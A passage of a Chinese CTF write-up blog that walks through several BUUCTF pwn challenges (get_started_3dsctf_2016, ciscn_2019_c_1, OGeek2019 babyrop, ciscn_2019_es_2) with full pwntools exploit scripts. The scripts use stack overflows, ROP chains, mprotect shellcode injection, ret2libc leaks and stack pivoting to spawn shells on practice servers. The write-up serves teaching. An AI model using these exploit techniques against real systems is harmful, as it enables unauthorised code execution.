keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25878</span><span class="token punctuation">)</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080b91e6</span>pop_edx_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806fc30</span>int80 <span class="token operator">=</span> <span class="token number">0x0806d7e5</span>mov_edx_eax_ret <span class="token operator">=</span> <span class="token number">0x080557ab</span>w_addr <span class="token operator">=</span> <span class="token number">0x80ea000</span><span class="token comment" spellcheck="true">#0x080eb020</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'/bin'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>w_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_edx_eax_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'/sh\x00'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>w_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_edx_eax_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>w_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int80<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">~</span>                              </code></pre><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>方法三：mprotect函数修改地址权限</p><p>利用mprotect()函数来修改内存权限，一般是将.bss端修改为可读可写可执行，然后通过read()函数向目标内存写入shellcode，然后getshell （因为是静态链接的，所有的函数都会链接到程序，肯定会存在一个mprotect（）函数 ）</p><p><img src="https://picx.zhimg.com/80/v2-6dbdaad88cfe982d0518d899ad3491db_720w.png"></p><blockquote><p>include &lt;sys/mman.h&gt; </p><p>int mprotect(void *addr, size_t len, int prot);addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。</p><p>len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。<br>prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：<br>1）PROT_READ：内存段可读；<br>2）PROT_WRITE：内存段可写；<br>3）PROT_EXEC：内存段可执行；<br>4）PROT_NONE：内存段不可访问。<br>返回值：0；成功，-1；失败（并且errno被设置）<br>1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。<br>2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。<br>3）ENOMEM：内核内部的结构体无法分配。<br>这里的参数prot：<br>            r:4<br>            w:2<br>            x:1</p></blockquote><p>我们通过vmmap可以看到0x080ea000到0x080ec000是可读可写但是不可执行的（开了NX保护），所以用mprotect()将这一段修改成可读可写可执行，然后通过read()传shellcode到此处</p><p><img src="https://pic1.zhimg.com/80/v2-262a105cb813d69dda9de13c35a7ecc0_720w.png"></p><p>需要注意的是mprotect指定的内存区间必须包含整个内存页（4K），并且区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍（0x1000=4096）</p><p>我们知道32位调用函数不需要寄存器传参，但是我们需要用pop，ret来控制程序运行流程， 用 ROPgadget 随便选一个有三个寄存器加一个ret的gadget </p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27364</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process('./get_started_3dsctf_2016')</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span> <span class="token punctuation">,</span> endian <span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#小端序，linux系统，32位架构,debug</span>mprotect <span class="token operator">=</span> <span class="token number">0x0806EC80</span>buf_addr <span class="token operator">=</span> <span class="token number">0x80eb000</span>   <span class="token comment" spellcheck="true">#要修改的内存页首地址</span>buf_size <span class="token operator">=</span> <span class="token number">0x1000</span>      <span class="token comment" spellcheck="true">#要修改的内存页大小</span>buf_prot <span class="token operator">=</span> <span class="token number">0x7</span>         <span class="token comment" spellcheck="true">#要修改的权限</span>pop_3_ret <span class="token operator">=</span> <span class="token number">0x08063adb</span>  <span class="token comment" spellcheck="true">#寄存器传参外加ret返回read函数地址 </span><span class="token comment" spellcheck="true">#0x08063adb : pop edi ; pop esi ; pop ebx ; ret</span>mprotect_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> <span class="token number">0x0806E140</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x38</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#先将返回地址覆盖为mprotect函数地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_3_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#通过三个寄存器传参再加上ret返回栈上下一个函数地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#要修改的内存页首地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf_size<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#要修改的内存页大小</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf_prot<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#要修改的权限</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#ret返回栈上下一个函数地址为read函数地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#read函数的返回地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#read函数的第一个参数</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#read函数的第二个参数</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#read函数的第三个参数</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>   sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#read函数输入buf_addr的字符串</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>参考文章</p><p><a href="https://blog.csdn.net/tbsqigongzi/article/details/124457938?spm=1001.2014.3001.5501">1</a>    <a href="https://blog.csdn.net/qq_15762939/article/details/104062307">2</a>  <a href="https://niceseven.github.io/post/2020/02/11/buuctf-pwn-get_started_3dsctf_2016/">3</a>  <a href="http://liul14n.top/2020/02/25/get-started-3dsctf-2016/">4</a>  <a href="https://www.shawroot.cc/2010.html">5</a>  <a href="https://blog.csdn.net/A951860555/article/details/111030289">6</a></p><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>简单的ret2libc3<br>file checksec —— 64-bit 开NX</p><h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>运行一下看看</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p><p>再看看IDA</p><p><img src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p><p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p><h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>分析大致流程就是</p><ol><li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li><li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li><li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’/bin/sh‘）</li></ol><h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28342</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_c_1'</span><span class="token punctuation">)</span>main<span class="token operator">=</span><span class="token number">0x400b28</span>pop_rdi<span class="token operator">=</span><span class="token number">0x400c83</span>ret<span class="token operator">=</span><span class="token number">0x4006b9</span>puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice!\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'\0'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'encrypted\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>offset<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice!\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'\0'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'encrypted\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p><blockquote><p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p></blockquote><p>覆盖数据payload=b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p><p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p><blockquote><p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever=’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p></blockquote><p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p><p>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参<br><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915046.webp"></p><p>注意栈对齐<br><img src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"></p><p>还有最后还要再输一个0</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915042.webp"></p><p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>64位程序，开启NX</p><p>没有system函数和/bin/sh字符串</p><h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。</p><p>main函数</p><p><img src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213530841-697585877.png" alt="image-20230807205450139"></p><p>sub_804871F函数</p><p><img src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213531189-116431913.png" alt="image-20230807205837589"></p><p>sub_80487D0函数</p><p><img src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213531499-314115011.png" alt="image-20230807205912958"></p><p>观察程序我们可以发现sub_80487D0函数有栈溢出漏洞</p><p>然而想要利用栈溢出需要我们达成两个目标</p><p>1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0</p><p>2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出</p><h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\x00’，可起到截断字符串长度的效果。</p><p>第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 = 255个字节，所以让buf[7] = ‘\xff’即可。代码中的buf[v5-1] = 0改变的是字符串末尾’\x00’的值，不影响buf[7] 。</p><p>所以第一次读取的payload为</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">+</span>b<span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span></code></pre><h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher</p><p>main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了</p><p>完整exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28188</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = process('./pwn')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">+</span>b<span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#main_addr = elf.plt['__libc_start_main']</span>main_addr <span class="token operator">=</span> <span class="token number">0x8048825</span>payload1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(hex(write_addr))</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span>  libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>32位开NX，有system函数，但是需要传入binsh。</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081134102.png" alt="image-20230808113405078"></p><p>然而，栈上变量 <strong>s</strong> 位于 <strong>ebp</strong>-0x28，而 <strong>read</strong> 函数仅能读入0x30个字节，那么若想实施缓冲区溢出，只有0x08 = 0x30-0x28个字节供我们进行布局。因此，在只有 <strong>ebp</strong> 与 <strong>ret</strong> 能被篡改的条件下可尝试使用栈迁移。</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081105982.png" alt="image-20230808110517945"></p><p>程序存在leave ret指令，并且存在system函数可执行</p><p>而binsh则需要在栈上传入</p><p>So，我们最终要将 <strong>esp</strong>（与 <strong>ebp</strong>）劫持到当前栈的另一区域上，以完成传统栈溢出payload的实施</p><p>在本题中，劫持目标地址即为缓冲区变量 <strong>s</strong> 的起始地址</p><h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><h3 id="第一步，泄露出ebp，通过ebp-偏移量的方法计算栈上地址"><a href="#第一步，泄露出ebp，通过ebp-偏移量的方法计算栈上地址" class="headerlink" title="第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址"></a>第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址</h3><p>printf函数在未遇到”\x00”时会一直输出，可以用来泄露出ebp的值</p><p>因为栈上地址间的相对位置是确定的，所以我们可以通过第二次输入的位置和泄露的ebp地址的偏移来定位我们的目标地址</p><p>在第二次输入read函数返回处下断点调试，计算可得泄露ebp与缓冲区起始位置相距0x38</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081121310.png" alt="image-20230808112121242"></p><h3 id="第二步-栈迁移"><a href="#第二步-栈迁移" class="headerlink" title="第二步 栈迁移"></a>第二步 栈迁移</h3><p>精心构造栈上的布局来实现栈迁移</p><h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p><del>此处盗图，已标明</del></p><p>画栈图有助于理解整个流程</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081132448.png" alt="image-20230808113204424"></p><p>整个长条表示read读入的字节长度0x30，old_ebp表示泄露的ebp，减去0x38指向的就是变量s的起始位置，返回地址被覆盖为leav_ret的地址。</p><p>第一次自带的leave指令执行后，ebp的值为old_ebp - 0x38 ，esp指向篡改的返回地址leave_ret；接着执行ret指令pop eip再一次执行leave ret</p><p>第二次leave指令执行后，esp指向ebp+4也就是图中’aaaa’的下一位，ebp的值仍为old_ebp - 0x38 ；此时已经完成栈迁移。接下来ret指令将ebp+4弹入eip执行，所以在aaaa之后的地址需要放置我们的system函数和binsh</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081146177.png" alt="image-20230808114650151"></p><p>binsh和其地址都可以在迁移过后的栈上布局</p><h2 id="0x04-3"><a href="#0x04-3" class="headerlink" title="0x04"></a>0x04</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28160</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> <span class="token number">0x08048400</span>leave_ret <span class="token operator">=</span> <span class="token number">0x080484b8</span>payload1 <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'B'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># not sendline</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span>original_ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>original_ebp<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> b<span class="token string">'aaaa'</span> <span class="token comment" spellcheck="true"># for location, start of hijaction</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> b<span class="token string">'dddd'</span> <span class="token comment" spellcheck="true"># fake stack ebp</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>original_ebp <span class="token operator">-</span> <span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># addr of binsh</span>payload2 <span class="token operator">+=</span> b<span class="token 